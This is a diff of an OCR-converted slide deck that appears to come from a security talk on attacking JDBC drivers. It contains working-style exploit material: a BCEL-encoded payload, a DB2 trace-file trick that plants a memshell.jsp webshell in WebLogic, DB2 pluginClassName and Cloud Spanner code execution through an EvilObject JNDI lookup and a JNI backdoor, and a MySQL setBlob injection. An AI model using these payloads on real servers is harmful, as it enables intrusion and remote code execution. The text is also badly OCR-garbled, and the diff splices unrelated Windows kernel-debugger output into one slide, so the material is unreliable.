-WtnStSLq$9fB$_S$v$caZ$bd$SAw$8cD$60$e2$7iSTScb$lo$s97y$c2$ba$a79_$84$c7S$d8$88S5c$84q$d9$3cY$ F8$5e$90Sa5$c7$c9$93Sel$b1$V$7b$ fF9PSefSa7SdFf$ Fd F2Sn$cO$ FESe6SWwSdb$9d$5b$k$d9PSc5SxBSad$H$db$bd$Xx$ f2$c7$ F9SQ$F
-3$b8$b7$a3$c8MM1$c6$1$M$916$ faSOS5d$b1$d1$df$d3ws$ flRo$a3$ef$d1$f71$ab$d4$ fbS$cb$b1$bdS$c7$9esxXrc$e4$c3$8cp$ fFdSbO$d9$ 7b$e4$de$a8$81$e9$8b$bFf$cec$97$7 F$a$ L$80$ FeS9OSNSc4F$ Ff FHS fF FS$c4ws$ fF fSn$c6$c52$9F$d6
-SGSF5$c1$cdFSFFLS3 Ff SbOSd1SbfSdOSbf SdaSe8SdfSe8SdFf$ fbScc$ faV$3b$_Sf1SCS$cd$ feSaf$8esS rO$1$jz$ 7 S80Se9S FFS7eSb3S7CS7 FfSe3RUSS$b8$b6k$e3$99S83SMAS8c$cd$b2$c4$d1$ebRSbdSadh$bb$a8$lS$b9G$j TUS a5$mSa9L$96$95F$e
-3$3e$q$95$86SSU$b4$92$$kSX$c9$d8$ FeaUSaO$T$ f7SZS85$RS$GSb9YSafcr$edSN$9c$3dw$d8SbO$3bY$d8$99D$ F78$c4q$ FEScOSe9ScO$ce$d1$89$SzS$af$cfkbsc$83$93N$jv$b4$cO$8FfI$8es L$94S$BSee$ f1$dd$86j $8a$3e$e3$9a$d63$d7$bc
-S40ASZScc$82SaaTws f2$7dS$ F7$3F$7d$88$ F4$ebSH$c4$9e$7bS$a7$c3S98SR$88S8d7kISSd6F$c7$91$86$a2$Z$ fe$_S$ZgS5cg$b3$ fcS$6O$cc$dc$92$d4Sa6$b2$b6$c1$zSkSeeSw$d8S$93$9 f$x$ZG$p$C$z$jrSur$fdSm$e8SdoOSs9las$a8$d3$b7n
-S$98S1TS$F5$s$da$b1$5d$d6$ f7$828$ fb$$$a76$ Fo$8F$3 fSGSmBS$aOSP$i$a2$dc$al$9a$98An$cc$ fes7b$b3c$a7$96M$8d$d2$96$a2$1$1$G$91Sw$ 7b$bdSb2$p$c5$a2U$ Fb$j $c1l$c2$8Ff2S$a4R$FSd6$3cS$b8S$5b$ IwQ$aasc7yk$a9$c8$caS95sYH
-LpES3 Fx6$ F8$9e4$a53Se4S0$L$ F1$8FS89SES TeSadSBOSebSC$9eSe6pSXps$ L$9c$7e$99$84$97 SbO8BS97p$j $d2$81$pSb4S8ssabScdsm$a0$cb$b4$84$ foOo0G4Sc0S$99885$3cSe8Scc$80$7d$ F25V$3a$b2MSD$alo$90$v$ F325N$86$c FOOSd3PDX6
-Scdl$93yy$d0az$93SW$j S83v$cb$97S$c9$89$db$ fFOSdOkd$cd$M$d8$8Ff$c63$a6$af$93$z$9eSZS$e4$d7m$ gy 6$dd$ba$ fb$c3$e5$n$c7$ed6$s8ds$$PsdesSba$ fb$96$c3t$87$ab6$j $s$d36$8d9L3S60$b3d$GF$c15$ FOSKS8d$83m$ F6u$ 7eSdf$s$ fo
-Shd$bd$z$dc$86$9a$d3$U$aGU$3a$GSh$b9$RO$d2$u$ael$a8$Y$c7j S$9dSs$vIStsvESaTSvsSNn$ca$yho$80$ fa$3a$85$e9CScOSdesAsSe6$c3Xx1$94Sc3SdFfSc7SvSaf Shs LSAwSY $d fSab$ F45E$8c$85$a9$90$ FaSUSeef$ FalzS9aSY$F6$i$a5$WwSE9s
-e4$86$e3SsSa9F$k$ f2$c29$t$a9L$3e$ F2C$8 f$d3T S$80$8c$m$dc$b7$d2s$a5$ByY$FSqSE$c8$Z2$dd$Fh$I$bb$98$vb$a653$ j 5$d353E$89T 3$c5$8eSces40y$ce8SISvsToOseSy$d4lLSebqScasmSwy$a8$7 fDSPd$j $db$9ap$3fSNsdfSob$c3$e7g$
-GSe0Se4mS3a$k$99Se5$de$9b$9d$c6$a3$FS$9eSbaS$bdSTaSbbN$5d$84$dc$SL$b8I$T$b4$a9sh$3cmH$81$pn$e8$e9r$9a$7eSM$G$e3G$85$7i$ F4SMSM9SCSeaQSdd$b8SBS5d3$9eN$ F3HS ad$P$ F7S$ca$c4s$c4$81S$ec$ FESbe$ 7db$d5$3e$Z$b20$8
-5$91SkS91Y$q$88$ fd$c46$9d$b4$3b$b6$e9$81e$93$k$d6$H$j $sS$cOOSnES$Qs$b3$ fd$n$8eSZr$MSe9SY$3d$PN$z$9b$j F$8eS3a$cdQ$w$87EGY8Secs$d4$ f2$bO0c$98$a3SkS$e6$uSabSc3$aas$a3$ac$ivj$f9$a8$e3$uG$3d$c2Q6$8/7MGSd98$ec$d
-4S F2$88c$84Sa3$ce$8c$ f5$d2$ fOQSqSUSbFSMSdaSdfSX$cfSM$Ff1$8b$d9$ fes fex$c6S82$VS$cfS$c9c$8ecz$ fe$js$8c$8cS$ZS$Z8SN$s86Es F3Saf$dOc$db$ F4SBp$99$5e$a3G3$D3q$ FOSKS6OSc5$d7$o$ FOS9CL$Z$db$ 7c$90kOSeaSY$d55$YS$e5$b0S
-o$d0$d9$e5$b1$81K$e3$93$e3S8e$b1m$3a$f7$rz$c1169$beM$d3$cbv$87$9d$ F3$ccp$9e$e3$8ese3$3a$cfqsSO$3b$b5$3c$el$98$A$k$85a$3fSbFS$X$3b$c1$b1$93$8el$ce8k$eaS9b$84$c8$_O9$a6t$cd$a7$i$93$s$5d$Ff1$Z$aesd7$ F2$I$
-c7$89$3b4$eb$40Su$k$c7Fs$9f$a73$0$ fb$ f21$ae$82c1l$AZ1$933$85$95$e3$q_S$dc$a2$el10$8c$L$b7S$ee$so$91$v$ f2$S$C$3cSy$bc$z$7c$X$Bs$ L$dO$93h$9bfaq$j $c5$d3$Y$aac$i$81$3Ff$8esab61A$PSal$ws$deGS4$83IXD2$3cA$P$meN$al
-SWSLBS f2$9eF$8d$3d$82SK9CSNzZ$94$3e$CS$ca$e7$e8s fd$ F471 z$8c$9eG$ fa$ddSBSd7$dbt$9e$ 7eEDNSc1J$ F3$c2$YSb9$84S$b4$m$9c$a3kK$82$8bSwss5$ t$e9Sb2$e0$al$r$nLw$84$P$d1U$nGO$T$9b$ F4$94$ FO1zZZ$ F8SULS$Selyr$L_S$n$8Ff$ FOS
-oy$85WwSc9$t$7cS9b$ Fc$c2$j$fOSbfMSRhS$besw$7c$8F$d6s F4D$ f For $80Se6$BSe8r $83NB$ f2g0$ F57$c8S0$ F9Sc F$91$8cS$ea$3 f$8esj $baSa4$SA6$B$ F9$d71 $DSabI $ec$e2$d3$93$7 FSKS$ Fb$cc$al$920$d0SISelas faSw$k$a9SE$ FbG$840$a2
-$946Se1$8f$87$84S afS91SK$v$sS9aSR$bes$1$5boSa0S8OSwss5$cfQ$85x$d3$ F4A$d3$wS60SupasL$5d$p$8FSC$92$bOScbSb3S80SNSYxS$G$e5$9c$t$x$7dD$b8$G$ L$dd$a0$a3$ F4$7i LSd6SA$b3$d1$ F3$c2$C5$BShSal$3b$c2$Qz$8F$9F$8escl
-O$df$a26$bo0$a3$ FOSd4m$eas40Sefl$gsQSbeC$5bz$af$gsSs$desa2$1$d7$8bxXx$T$ Fes 7eSKESCCS7bOS8aSGSe fBy$bb$des$7b$8c$ FFS9FS40_35d3GSeFS7 FSbd$a6$_S$3e$86_$84$ Ff f$a2$xXSeeSc2$a8$81$jnSoSd1L$3Ff$ F5$9FSO$y$do0seb$7d
 Se6se3sff$DSccp$f1i$T$L$iSA$sA') .newInstance() }; traceFi leAppend=false; traceLevel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/memshell. jsp;
 ```
 
 ## Slide 23
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-€ > CG © 127.0.0.1:7001/console/framework/skins/wlsconsole/images/mshell.jsp ox*x* @eqQgowmwmeesg#Hvdodod @n oy i:
-java.io.tmpdir=/var/folders/y2/p6q9zkfn52571162r_nceqShh0000gn/T/, java.vendor.url.bug=http://bugreport.sun.com/bugreport/, os.arch=x86_ 64, java.awt.graphicsenv=sun.awt.CGraphicsEnvironment,
-java.ext.dirs=/Users/pyn3rd/Library/Java/Extensions:/Library/Java/JavaVirtualMachines/jdk1.8.0_60,jdk/Contents/Home/jre/lib/ext:/Library/Java/Extensions:/Network/Library/Java/Extensions:/System/Library/Java/Extensions:/usr/lib/java,
-user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
-javax.management.builder.initial=weblogic. management.jmx .mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg-CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1.8, launch.use.env.classpath=true } [ibm][db2]
-[jcc] Dumping all file properties: { } [ibm][db2][jcc] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jcc] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
-traceLevel=-1, traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/mshell.jsp, user=weblogic,
-password: KAKKKAARKAAAKAAKAKKAAARAAKRAAARAAKAKKAA KR RRAKAAAKK KAA AAA RAKAAAKRARAAKARAARKAAA RAR KR KAAARAAA KAA AKAAA AAA RK RAAAK RAK AAA KARA A RAARRAAARAA RRA A RAK KRAAARKRAARARARKRA KARA RAA KAKA RAK RKAA AK RAAKKAAA RAK AAAARRAAKA RARE RAAK
-url=jdbe:db2://127.0.0.1:5001 /test:password=$$BCELS$$IS8b$I$ASASASA$SASASA $adXS8b$7b$Sb$c7Y $7fO$y$Sb$b2$o$c7 HHAbH$3bQ$Ib$a6M$b7n$89$j$d7$b2SS$c7$b | $93$Se$be$a3 $hb$z$cI$9 | d$Sd$b3$dOSj$j$j/KS8a$8fF$$95$8enfHbO$c | $HS9:
-traceFileAppe >, username=weblogic } [ibm][db2][jec] END TRACE_CONNECTS [ibm] [db ¢] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExccuteThread for queue: 'weblogic.kerncl.Default (self-tuning)']
-[SQLException @ 1432618] java.sql. SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '7' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 1432618] SQL state = null [ibm][db2]{jcc][Thread:[ACTIVE] ExecuteThread:
-for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 1432618] Error co 99999 |ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '7' f ue: ri¢ = [ibm]
-[db2][jcc][10333][ 11649] No license was found. An appropriate license file db2jcc_license_ must be provided in the CLASSPATH setting. [ibm][|db2]|jcc][Threa uy 4 :'7' for queue: 'weblogic.kernel.Default (self-tuning)']
-[SQLException @ 1f432618] Stack trace follov m.ibm.db2.jec.c.SqlException: [ibm][db2][jcc][10333][11649] No license was found. An ap te license file db2jec_li jided in the CLASSPATH setting. at
-com.ibm.db2.jcc.c.o.d(o.java:534) at com.ibm.db2.jcc.c.p.a(p, 332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.,jcc.b.b.(b jav at com.ibm.db2.jcc.DB2Driv
-weblogic .jdbc.common internal.DataSourceUtil.testConnection0(DataSourceUtil java:373) at weblogic.jdbc.common.internal.DataSourceUtil.access$000(DataSourceUtil.java:
-weblogic .jdbc.common internal.DataSourceUtil$ 1 .run(DataSourceUtil java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic .jdbc.common internal.DataSourceUtil.testConnection(DataSourceUtil java:284) at
-com.bea.console.utils jdbc JDBCUtils.testConnection(IDBCUtils java: 1011) at com.bea.console.actions jdbc datasources.createjdbcdatasource.CreateJ DBCDataS ource.testConnectionConfiguration(CreateJDBCDataSource java:524) at
-sun reflect. NativeMethodAccessorlmpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorlmpl.invoke(NativeMethodAccessorImpl.java:62) at sun reflect DelegatingMethodAccessorlmpl.invoke(DelegatingMethodAccessorlmpl java:43) at
-java.lang reflect.Method invoke(Method.java:497) at org.apache.beehive netui pageflow.FlowController.invokeActionMethod(FlowController.java:870) at
-org.apache beehive netui pageflow.FlowController.getActionMethodForward(FlowController.java:809) at org .apache.beehive netui pageflow.FlowController.internalExecute(FlowController.java:478) at
-.apache. beehive netui pageflow.PageFlowController.internalExecute(PageFlowController,java:306) at org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336) at
-€ > G © 127.0.0.1:7001/console/aaaa?emd=!s%20-I ca* @©@egou@eeSBHodgd @z oy:
-total 40
-drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 autodeploy
-drwxr-x--- 21 pyn3rd staff 672 Jun 20 11:25 bin
-drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 common
-drwxr-x--- 10 pyn3rd staff 320 Sep 14 13:33 config
-drwxr-x--- 3 pyn3rd_ staff 96 Jun 20 11:25 console-ext
--IW------- 1 pyn3rd staff 136 Sep 14 13:31 derby.log
--rw-r----- 1 pyn3rd_ staff 92 Sep 14 13:31 derbyShutdown. log
--rw-r----- 1 pyn3rd staff 263 Sep 14 13:31 edit.lok
--rw-r----- 1 pyn3rd staff 327 Apr 26 2019 fileRealm.properties
-drwxr-x--- 14 pyn3rd staff 448 Jun 20 11:25 init-info
-drwxr-x--- 7 pyn3rd staff 224 Sep 13 22:39 lib
-drwxr-x--- 4 pyn3rd staff 128 Jun 20 11:25 nodemanager
-drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:28 orchestration
-drwxr-x--- 3 pyn3rd staff 96 Sep 14 13:36 original
-drwxr-x--- 2 pyn3rd staff 64 Apr 26 2019 resources
-drwxr-x--- 7 pyn3rd staff 224 Jun 20 11:28 security
-drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 servers
+CI TOCTOU: Code Execution
+
+Break instruction exception - code 80000003 (first chance)
+0033:00007fff`addb1550 cc                  int     3
+5: kd> db @rip
+00007fff`addb1550  cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
+00007fff`addb1560  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+00007fff`addb1570  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+00007fff`addb1580  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+00007fff`addb1590  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+00007fff`addb15a0  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+00007fff`addb15b0  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+00007fff`addb15c0  ca fe c0 de ca fe c0 de-ca fe c0 de ca fe c0 de  ................
+5: kd> dx @$curprocess->Name
+@$curprocess->Name : services.exe
+    Length           : 0xc
+5: kd> dx @$curprocess->KernelObject->Protection
+@$curprocess->KernelObject->Protection                [Type: _PS_PROTECTION]
+    [+0x000] Level            : 0x61 [Type: unsigned char]
+    [+0x000 ( 2: 0)] Type             : 0x1 [Type: unsigned char]
+    [+0x000 ( 3: 3)] Audit            : 0x0 [Type: unsigned char]
+    [+0x000 ( 7: 4)] Signer           : 0x6 [Type: unsigned char]
 ```
 
 ## Slide 24
@@ -585,7 +500,8 @@ JDBC Attack Protection
 
 • PreparedStatement.setBlob()
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 10
@@ -595,12 +511,10 @@ JDBC Attack Protection
 14
 15
 MySQL JDBC Driver SQL Injection via setBlob Method
-* PreparedStatement.setBlob()
 @Override
 public void setBlob(int parameterIndex, InputStream inputStream) throws SQLException {
 synchronized (checkClosed().getConnectionMutex()) {
 ((PreparedQuery<?>)
-e) this.query) .getQueryBindings().setBlob(getCoreParameter Index (parameterIndex), inputStream) ;
 }
 @Override
 public void setBlob(int parameterIndex, InputStream inputStream, long Length) throws SQLException
@@ -609,7 +523,6 @@ synchronized (checkClosed().getConnectionMutex()) {
 this.query) .getQueryBindings() .setBlob(getCoreParameterIndex(parameterIndex) , inputStream,
 length) ;
 at
-r
 ```
 
 ## Slide 27
@@ -618,7 +531,8 @@ r
 
 •
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MySQL JDBC Driver SQL Injection via setBlob Method
@@ -648,20 +562,19 @@ Payload
 
 1
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MySQL JDBC Driver SQL Injection via setBlob Method
 f Dabase Server |
 Payload Master MySQL Slave MySQL
-DriverManager.registerDriver (new com.mysql.cj}.jdbc.Driver());
 Connection conn =
 DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test?user=root&password=pynerd123&useUnicode=true&ch
 aracterEncoding=gbk&al LowMultiQueries=true") ;
 PreparedStatement ps = conn.prepareStatement ("INSERT INTO tl (size, data) VALUES(?,?)");
 File file = new File("/Users/pyn3rd/exp.jpg") ;
 FileInputStream fis = new FileInputStream(fi le) ;
-ps.setInt(1, (int) file. length ()) ;
 ps.setBlob(2, fis);
 ps.execute() ;
 fis.close();
@@ -671,7 +584,8 @@ fis.close();
 
 MySQL JDBC Driver SQL Injection via setBlob Method
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 import java.io.x;
@@ -679,7 +593,6 @@ import java.sql.*;
 MySQL JDBC Driver SQL Injection via setBlob Method
 > public class MySQLJdbcDemo {
 public static void main(String[] args) throws ClassNotFoundException, SQLException, IOException {
-DriverManager .registerDriver(new com.mysql.cj.jdbc.Driver()) ;
 Connection conn = DriverManager .getConnection( url: "jdbc:mysql://127.0.0.1:3306/test ?>user=root&password=pynerd123&useUnicode=true&characterEncoding=gbk&al LowMuLtiQueries=true") ;
 PreparedStatement ps = conn.prepareStatement( sql: "INSERT INTO t1 (size, data) VALUES (?,?)");
 File file =
@@ -702,14 +615,8 @@ com
 com
 com
 com
-mysql.
 -mysql.
--mysql.
--mysql.
--mysql.
-ape
 cj.
-Cir
 cj.
 "main"
 jdbc.
@@ -719,9 +626,7 @@ jdbc.
 java.sql.SQLSyntaxErrorException Create breakpoint : Table 'test.t1' doesn't exist
 exceptions.SQLError.createSQLException(SQLError.java:120)
 exceptions.SQLExceptionsNapping. transLateException(SQLExceptionsMapping. java:122)
-ClientPreparedStatement.executeInternal(ClientPreparedStatement. java:953)
 ClientPreparedStatement.execute(ClientPreparedStatement.java:370)
-jdbc.test.MySQLJdbcDemo.main(MySQLJdbcDemo. java:17)
 ```
 
 ## Slide 31
@@ -746,18 +651,17 @@ JDBC Attack Protection
 
 **Getter and Setter**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
-* pluginClassName
 1 public synchronized void setPluginClassName (String paramString)
 2 this.pluginClassName = paramString;
 3
 4
 5 public String getPluginClassName() {|
 6 return this.pluginClassName; | Getter and Setter |
-vA j
 8
 9 public static String getPluginClassName(Properties paramProperties)
 10 O return paramProperties.getProperty ("pluginClassName") ;
@@ -770,17 +674,15 @@ vA j
 
 • No Argument Constructor
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
 * No Argument Constructor
 import javax.naming.NamingException;
-import java.710.IOException;
 public class EvilObject {
 public EvilObject () throws NamingException, IOException {
-javax.naming.InitialContext.doLookup("lLdap://127.0.0.1:389/Evi LObject") ;
-at
 J
 ```
 
@@ -792,21 +694,12 @@ J
 
 **Thoughts Class**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
-* No Argument Constructor
-Thoughts Class
-DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver
-DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/testdb: plLuginClLassName=com.example.demo.EvilObject;"
-```
-
 ## Slide 35
 
 ## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
@@ -814,26 +707,16 @@ import java.sql.DriverMaonager ;
 15 usages
 > public class DB2JCCDemo {
 b public static void main(String[] args) throws Exception { eee
-DriverManager.registerDriver(new com.ibm.db2.jcc.D0B2Driver());
 DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb:pluginClassName=com.example.EvilObject;"); Fi 8 fe)
-Sh
-ol
 o
-EEE ©
 Run: DB2JCCDemo
-> htt Gon. abm.db2. jec . UB2Uriver .connect (DB2Driver, java: 471)
 at com.ibm.db2.jcc.DB2Driver.connect( Driver.java:117)
-FaaN at java.sql.DriverManager.getConnection (DriverManager. java: 664)
-= at java.sql.DriverManager .getConnection(DriverManager.java:270)
 it at com.example.jdbc.attack.db2.DB2JCCDemo.main(DB2JCCDemo. java:13)
 = Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DE
-= ' at com.ibm.db2.jcc.am.is.aCi Actsiep)
 - 11 more
 Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14226][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
-at com.ibm.db2.jcc.am.b7.a(b7. java: 794)
 at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
 at com.ibm.db2.jcc.am.b7.a(b7. java:116)
-at com.ibm.db2.jcc.am.ct.run(ct. java: 33)
 13 more
 Process finished with exit code 1
 ```
@@ -861,7 +744,8 @@ MacOS JVM
 
 com.sun.security.auth.module.UnixSystem
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 com.sun.security.auth.module.UnixSystem
@@ -905,7 +789,8 @@ JNI Backdoor for Command Execution
 
 ##### **libjaas_unix.dylib**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 JNI Backdoor for Command Execution
@@ -921,13 +806,11 @@ jclass system_clazz = env—>FindClass("java/lang/System") ;
 jmethodID get_property_method = env->GetStaticMethodID(system_clazz,
 if (get_property_method == NULL) {
 return JNI_VERSION_1_2;
-r)
 jboolean jsCopy;
 const charx cmd = env->GetStringUTFChars (env->NewStringUTF ("open
 std::string ee;
 system(ee.c_str());
 return JNI_VERSION_1_2;
-I) pes
 or"), &jsCopy) ;
 ```
 
@@ -937,13 +820,13 @@ or"), &jsCopy) ;
 
 - Remote Code Execution with JNI
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
 ¢ Remote Code Execution with JNI
 DriverManager.registerDriver com.ibm.db2.jcc.DB2Driver
-DriverManager .getConnection("jdbc:db2://127.0.0.1:5001/test:pluginC LassName=com.sun.security.auth.module.Unix
 System;"
 ```
 
@@ -951,7 +834,8 @@ System;"
 
 IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
@@ -962,16 +846,13 @@ public static void main(String[] args) throws Exception {
 DriverManager.registerDriver(new com.ibm.db2.jcc.0B2Driver());
 // Get Connection
 DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb : pluginClassName=com. example.Evil0bject;") ;
--com.example.jdbc.attack.db2.DB2JCCDemo »
 at com.ibm.db2.jcc.DB2Driver.connect (DB2Driver. java:117)
 at java.sql.DriverManager .getConnection(DriverManager. java:664)
 at java.sql.DriverManager .getConnection(DriverManager. java:270)
-at com.example. jdbc. attack.db2.DB2ICCDemo.main(DB2JCCDemo. java:12)
 Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB
 at com.ibm.db2.jcc.am.is.a(Cis. java: 4586)
 - 11 more
 Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
-at com.ibm.db2.jcc.am.b7.a(b7. java: 794)
 at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
 at com.ibm.db2.jcc.am.b7.a(b7. java:116)
 at com.ibm.db2.jcc.am.ct.run(ct.java:33)
@@ -984,11 +865,11 @@ at com.ibm.db2.jcc.am.ct.run(ct.java:33)
 
 ###### • CredentialsProvider
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Google Cloud Spanner Remote Code Execution via Unchecked Class
-* CredentialsProvider
 1 static @Nullable CredentialsProvider parseCredentialsProvider (String uri) {
 2 String name parseUriProperty (uri, CREDENTIALS_PROVIDER_PROPERTY_NAME) ;
 3 (name != null) {
@@ -1007,7 +888,8 @@ Google Cloud Spanner Remote Code Execution via Unchecked Class
 
 Google Cloud Spanner Remote Code Execution via Unchecked Class
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 >
@@ -1015,14 +897,9 @@ Google Cloud Spanner Remote Code Execution via Unchecked Class
 Run:
 Google Cloud Spanner Remote Code Execution via Unchecked Class
 import java.sql.DriverManager;
-import java.sql. SQLException;
 public class CloudSpannerDemo {
 public static void main(String[] args) throws SQLException {
 System.setProperty("cmd","open -a calculator") ;
-DriverManager.registerDriver(new com.google.cloud.spanner. jdbc. JdbcDriver()) ;
-DriverManager .getConnection( url: "jdbc:cloudspanner: /projects/lLearning-pjm/instances/test/databases/test; credentialsProvider=com.sun. security .auth.module.UnixSystem") ;
-eee
-com.mysql.jdbc.test.CloudSpannerDemo
 au
 at
 Caused
@@ -1031,8 +908,6 @@ at
 at
 at
 at
-Java. sqc-Dra
-CTManager.ogecoOMmicc LLUN (UE LVElmdiayer. java. 2/0)
 com.mysql.jdbc.test.CloudSpannerDemo .main(€LoudSpannerDemo. java:14)
 by: java.lang.ClassCastException Create breakpoint
 com.google
@@ -1042,21 +917,14 @@ com.google
 com.google.
 3 more
 .cloud.
--cloud.
 cloud.
 -cloud.
 cloud.
-spanner.connection.ConnectionOptions.parseCredentialsProvider (ConnectionOptions. java: 747)
-spanner.connection.ConnectionOptions.<init>(ConnectionOptions. java: 564)
-spanner.connection.ConnectionOptions.<init>(ConnectionOptions. java:83)
-spanner .connection.ConnectionOptions$Builder. build (Connection0ptions. java: 508)
 spanner. jdbc. JdbcDriver.connect (JdbcDriver. java:195)
 Prorece fFfiniched with evit code 1
 AC
--
 %
 com.sun.security.auth.module.UnixSystem cannot be cast to com.google.api.gax.core.CredentialsProvid
-GERRRE -
 ```
 
 ## Slide 45
@@ -1077,7 +945,8 @@ GERRRE -
 
 Apache Calcite Avatica Remote Code Execution via Unchecked Class
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Apache Calcite Avatica Remote Code Execution via Unchecked Class
@@ -1091,7 +960,6 @@ return AvaticaHttpClient.class.cast(instance) ;
 throw new RuntimeException("Failed to construct AvaticaHttpClient implementation
 + className, e);
 10
-LS
 11 i
 ```
 
@@ -1101,7 +969,8 @@ LS
 
 ###### **Thoughts Class**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
